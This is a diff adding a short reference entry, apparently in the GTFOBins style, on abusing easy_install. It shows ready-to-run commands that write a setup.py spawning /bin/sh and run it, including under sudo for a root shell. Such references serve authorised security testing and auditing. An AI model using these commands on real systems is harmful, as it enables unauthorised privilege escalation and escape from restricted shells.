@@ -1,0 +1,27 @@
+easy_install
+============
+
+Inherit
+-------
+
+[Sudo]
+    echo '...' >setup.py
+easy_install .
+    This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).
+
+Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:
+
+```
+echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
+```
+
+[Unprivileged]
+    echo '...' >setup.py
+easy_install .
+    This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).
+
+Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:
+
+```
+echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
+```
